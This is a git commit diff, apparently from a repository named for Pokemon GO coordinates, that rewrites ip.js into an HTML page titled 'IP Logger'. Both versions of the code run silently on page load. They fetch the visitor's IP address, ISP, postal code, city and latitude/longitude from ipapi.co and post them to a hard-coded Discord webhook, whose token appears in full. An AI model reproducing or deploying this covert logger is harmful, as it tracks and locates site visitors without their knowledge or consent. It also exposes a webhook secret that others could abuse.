c08618daf940ec7463b95f4e4ba8bc5f92a951b3
Pokemon GO Coordinates <168881691+pgcoordinates@users.noreply.github.com>
2024-11-03 08:13:08 +0530

    Update ip.js

--- ip.js
+++ ip.js
@@ -1,30 +1,31 @@
-// IP Logger
-$(document).ready(function() {
-  // Get user information using IPAPI
-  $.get("https://ipapi.co/json/", function(data) {
-      // Send user information to Discord webhook
-      var formattedData = "**IP: **" + data.ip + "\n" +
-                          "**Network: **" + data.network + "\n" +
-                          "**Version: **" + data.version + "\n" +
-                          "**ASN: **" + data.asn + "\n" +
-                          "**ISP: **" + data.org + "\n" +
-                          "**City: **" + data.city + "\n" +
-                          "**Postal Code: **" + data.postal + "\n" +
-                          "**Region: **" + data.region + "\n" +
-                          "**Country: **" + data.country_name + "\n" +
-                          "**Capital: **" + data.country_capital + "\n" +
-                          "**Country Population: **" + data.country_population + "\n" +
-                          "**Calling Code: **" + data.country_calling_code + "\n" +
-                          "**Latitude: **" + data.latitude + "\n" +
-                          "**Longitude: **" + data.longitude + "\n" +
-                          "**Timezone: **" + data.timezone + "\n" +
-                          "**Currency: **" + data.currency + "\n";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <!-- Include jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <script>
+        $(document).ready(function() {
+            // Get user information using IPAPI
+            $.get("https://ipapi.co/json/", function(data) {
+                // Prepare JSON payload with user information
+                var jsonData = {
+                    content: JSON.stringify(data, null, 2)  // Stringify JSON data to maintain structure
+                };
 
-      $.ajax({
-          type: "POST",
-          url: "https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN",
-          data: JSON.stringify({ content: formattedData }),
-          contentType: "application/json"
-      });
-  });
-});
+                // Send user information to Discord webhook
+                $.ajax({
+                    type: "POST",
+                    url: "https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN",
+                    data: JSON.stringify(jsonData),
+                    contentType: "application/json"
+                });
+            });
+        });
+    </script>
+</body>
+</html>
